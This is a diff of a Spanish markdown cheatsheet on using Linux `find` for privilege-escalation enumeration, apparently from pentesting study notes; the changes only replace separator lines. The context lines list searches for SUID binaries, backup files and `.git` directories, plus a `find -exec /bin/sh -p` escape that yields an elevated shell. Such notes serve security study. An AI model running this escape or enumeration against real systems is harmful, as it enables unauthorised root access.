@@ -11,7 +11,7 @@ linked:
 > [!info]
 > Buscar archivos por nombre, permisos, tamaño, fecha, owner. Core en Linux PrivEsc enum (SUID bins, world-writable files, etc.).
 
-***
+---
 
 ## Cheatsheet
 
@@ -29,7 +29,7 @@ linked:
 | `find / -name "*.bak" 2>/dev/null` | Backup files | Source / config leaks |
 | `find / -path '*/proc' -prune -o -name '.git' -print 2>/dev/null` | `.git` dirs (excluyendo /proc) | Source disclosure |
 
-***
+---
 
 ## SUID exploitation flow
 
@@ -45,7 +45,7 @@ find / -perm -4000 -type f 2>/dev/null
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
-***
+---
 
 ## Notas Relacionadas
 
